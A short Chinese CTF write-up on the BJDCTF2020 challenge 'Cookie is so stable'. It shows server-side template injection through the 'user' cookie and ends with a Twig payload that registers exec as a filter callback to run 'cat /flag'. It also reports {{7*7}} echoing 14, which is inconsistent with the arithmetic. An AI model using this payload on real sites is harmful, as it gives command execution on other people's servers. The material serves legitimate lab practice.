---
title: BJDCTF2020 Cookie is so stable
date: 2023-11-16
categories:
  - CTF
  - Web
---

## 前置工作

打开靶机网页，寻找注入点

![](https://z1.ax1x.com/2023/11/06/pildCOU.png)

发现这里输入什么都会原模原样地回显，再根据题目中提到的 Cookie，发现有一个 Cookie 叫做 user，与我们输入的内容挂钩，判断此 Cookie 为注入点

于是试试看 SSTI，输入一个 `{{7*7}}`，发现回显是 `14`，那么 SSTI 实锤了，现在就想想看是哪个引擎，目前能从 Wappalyzer 上得出来的只是 PHP，那么大概率是 Twig，验证一下

我们在 `user` 中输入 `{{7*'7'}}`，如果返回是 `49`，那么就是 Twig（如果返回是 `7777777`，就是 Jinja2）

## 构建 Payload

既然是 Twig，那么 Payload 就是固定的，有一个查看 Flag 的 Payload 就是

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

最后得出 Flag 是 `flag{38e17dcd-e574-4bec-80a1-2eee0b58dd64}`